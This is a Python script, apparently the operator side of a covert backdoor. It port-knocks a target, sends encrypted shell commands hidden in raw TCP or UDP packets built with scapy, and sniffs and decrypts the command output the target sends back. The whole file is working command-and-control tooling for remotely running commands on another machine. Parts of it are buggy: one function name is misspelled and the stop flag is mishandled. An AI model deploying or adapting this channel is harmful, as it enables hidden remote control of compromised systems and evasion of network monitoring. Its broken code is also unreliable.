#!/usr/bin/python

import time, configfile, logging, encryption, packetFunctions
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# flag to determine when to stop reading the results of a command and decrypt everything
flag = False

encryptedResults = ""

def portKnock():
    for knock in configfile.knock:
        packet = IP(dst=configfile.ip)/UDP(sport=knock, dport=7000)
        send(packet)
        time.sleep(1)

def sendCommand(protocol, data, password):
    if protocol == "tcp":
        packet = IP(dst=configfile.ip)/TCP(dport=8000, sport=7999)/Raw(load=encryption.encrypt(password+data, configfile.password))
    if protocol == "udp":
        packet = IP(dst=configfile.ip)/UDP(dport=8000, sport=7999)/Raw(load=encryption.ecrypt(password+data, configfile.password))
    send(packet)

def recvCommand(packet):
   global flag
   global encryptedResults
   if packet.haslayer(IP):
    if packet[IP].src == configfile.ip:
        dataReceived = packetFunctions.parsePacket(packet)
        encryptedResults += dataReceived
        print("encr results")
        # encrypted data should be a string of either 1 or 2 characters
        # appent those characters to the global encrypted string
        if packet.haslayer(Raw):
            print ("has raw")
            if packet[Raw].load == configfile.password:
                print ("rec password")
                flag = True
                print encryptedResults
                print len(encryptedResults)
                decryptedData = encryption.decrypt(encryptedResults, configfile.password)
                print decryptedData
                # decrypt that global encrypted string here, print it, and then set it to "" again

        # data = encryption.decrypt(packet['Raw'].load, configfile.password)
        # if data.startswith(configfile.password):
        #     data = data[len(configfile.password):]
        #     print data

def main():
    global var
    portKnock()

    while 1:
        command = raw_input("Enter command: ")
        sendCommand(configfile.protocol, command, configfile.password)
        flag = False
        while 1:
            sniff(filter='{0} and dst port 8000'.format(configfile.protocol), prn=recvCommand)
            if flag == True:
                break

if __name__ == '__main__':
    main()
